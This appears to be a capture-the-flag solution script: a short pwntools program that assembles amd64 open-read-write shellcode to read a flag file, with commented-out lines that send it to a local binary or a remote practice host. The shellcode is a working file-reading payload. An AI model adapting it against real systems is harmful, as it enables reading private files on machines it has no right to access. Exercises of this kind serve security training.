from pwn import *

context.arch = "amd64"

# fd = open("/home/orw64/flag",0)
# size = read(fd,buf,0x40)
# write(1,buf,size)
# exit
shellcode = """
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    jmp str
open:
    pop rdi
    mov rax, 2
    syscall
read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x40
    xor rax, rax
    syscall
write:
    mov rdx, rax
    mov rdi, 0x1
    mov rsi, rsp
    mov rax, 0x1
    syscall
exit:
    mov rax,0x3c
    syscall

str:
    call open
    .ascii "/home/orw64/flag"
    .byte 0
"""

#print shellcode
print asm(shellcode)

#r = process('./orw64')
#r = remote('pwnhub.tw', 11112)
#r.recvuntil(':')
#r.send(asm(shellcode))
#r.interactive()
